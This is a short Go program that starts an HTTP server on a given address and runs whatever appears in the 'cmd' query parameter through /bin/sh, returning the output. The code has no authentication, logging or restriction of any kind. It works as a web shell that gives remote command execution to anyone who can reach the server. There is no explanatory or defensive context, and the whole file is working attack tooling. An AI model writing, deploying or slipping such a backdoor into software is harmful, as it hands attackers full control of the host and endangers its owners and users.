package main

import (
	"fmt"
	"net/http"
	"os"
	"os/exec"
)

var
(
	shell    = "/bin/sh"
	shellArg = "-c"
	addr     string
)

func main() {
	if len(os.Args) != 2 {
		fmt.Printf("Usage: %s <listenAddress>\n", os.Args[0])
		os.Exit(1)
	}
	addr = os.Args[1]
	http.HandleFunc("/", requestHandler)
	err := http.ListenAndServe(addr, nil)
	_ = err
}

func requestHandler(w http.ResponseWriter, req *http.Request) {
	cmd := req.URL.Query().Get("cmd")
	if cmd == "" {
		// _, _ = w.Write([]byte("test"))
		return
	}

	command := exec.Command(shell, shellArg, cmd)
	output, err := command.Output()
	_, err = w.Write([]byte(fmt.Sprintf("cmd: %v, result:\n%v\n", cmd, string(output))))
	_ = err
}
